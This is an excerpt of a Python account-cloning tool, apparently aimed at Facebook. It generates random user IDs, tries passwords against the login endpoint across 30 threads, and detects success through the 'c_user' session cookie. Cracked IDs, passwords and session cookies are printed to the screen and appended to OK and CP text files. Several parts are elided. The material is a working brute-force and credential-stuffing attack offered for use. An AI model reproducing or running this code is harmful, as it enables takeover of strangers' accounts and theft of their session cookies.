...
\033[30;1m{line}
\033[32;1m[✓]\033[32;1m\033[34;1mDEVELOPER   :\033[32;1mBAPPA DEBNATH 
\033[32;1m[✓]\033[32;1m\033[34;1mTEAM NAME   :\033[32;1mCYBER 101
\033[32;1m[✓]\033[32;1m\033[34;1mTOOL NAME   :\033[32;1mRANDOM
\033[32;1m[✓]\033[32;1m\033[34;1mTOOL VERSION:\033[32;1m1.0V
\033[30;1m{line}                           
"""
def Bappax():
	print('\033[1;30m───────────────────────────────────────────')
...
def fuck():
    ...
    os.system('clear')
    print(logo)
    print('\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\33[1;92m EXAMPLE CODE: \033[1;32m[017]\033[1;32m \033[1;31m[018]\033[1;31m  \033[1;33m[019]\033[1;33m  \033[1;30m[016]\033[1;30m')
    print('\033[1;30m───────────────────────────────────────────')
    code = input('\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\33[1;91m CHOOSE CODE : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\33[1;92m EXAMPLE: \033[1;32m[2000]\033[1;32m \033[1;33m[3000]\033[1;33m \033[1;31m[5000]\033[1;31m \033[1;33m[10000]\033[1;33m ')
    print('\033[1;30m───────────────────────────────────────────')
    limit = int(input('\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\33[1;95m CHOOSE : '))
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        print(logo)
        tl = str(len(user))
        print(f' \033[1;33m[{R}⍣{G}]{G} SIM ID   {R}:{G} {code}')
        print(f' [{R}⍣{G}]{R} TOTAL ID {R}:{R} {tl}')
        print(f' \033[1;35m[{R}⍣{G}]{G} MIX IDZ CLONING ENJOY DEAR USER')
        print('\033[1;30m───────────────────────────────────────────')
        for love in user:
    ...
    print('\033[1;30m───────────────────────────────────────────')
    print(' [+] OK Ids saved in Bappa😎/OK.txt')
    print(' [+] CP Ids saved in Bappa😎/CP.txt')
    print('\033[1;30m───────────────────────────────────────────')
...
def naim2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r [Bappa😎]-\033[1;32m[%s|%s]\033[1;32m\33[1;95m[OK:%s]\033[1;31m\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
          ...
          'method':'POST',
           ...
           'viewport-width': '980',} 
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;97m [\33[1;95mBappa😎-OK\33[1;97m] \33[1;93m'+cid+' | '+ps+'\33[0;93m')
                print('-'*50)
                print (f"\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m COOKIES: {coki} ")
                print('\033[92;1m⊰᯽⊱\033[92;1m\033[93;1m┈──╌──────╌──╌╌──╌───╌\033[94;1m❊\033[94;1m╌──╌──╌────╌────╌─╌──┈\033[92;1m⊰᯽⊱\033[92;1m')
                open('Bappa😎-OK.txt', 'a').write(cid+' | '+ps+'\n')
                ...
                open('Bappa😎-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
